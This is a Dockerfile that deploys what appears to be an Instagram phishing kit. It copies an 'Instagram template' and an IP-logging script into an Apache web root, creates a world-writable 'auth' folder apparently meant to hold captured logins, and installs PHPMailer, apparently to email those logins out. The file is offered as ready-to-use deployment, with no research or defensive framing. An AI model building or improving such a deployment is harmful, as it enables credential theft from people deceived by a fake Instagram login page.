FROM php:apache

# Copy your Instagram template
COPY .sites/instagram /var/www/html/
COPY .sites/ip.php /var/www/html/

# Create auth directory
RUN mkdir -p /var/www/html/auth && chmod 777 /var/www/html/auth

# Enable Apache modules
RUN a2enmod rewrite

# ================================================
# INSTALL COMPOSER + PHPMailer
# ================================================
# Install Composer
RUN curl -sS https://getcomposer.org/installer | php -- --install-dir=/usr/local/bin --filename=composer

# Copy composer.json (and composer.lock if you have one)
COPY composer.json /var/www/html/composer.json

# Install dependencies (PHPMailer)
RUN cd /var/www/html && composer install --no-dev --optimize-autoloader

# Move the vendor folder to where PHP can find it (or keep it in /var/www/html)
# The autoload path in login.php will be /var/www/html/vendor/autoload.php

# ================================================

EXPOSE 80

# Start Apache
CMD ["apache2-foreground"]
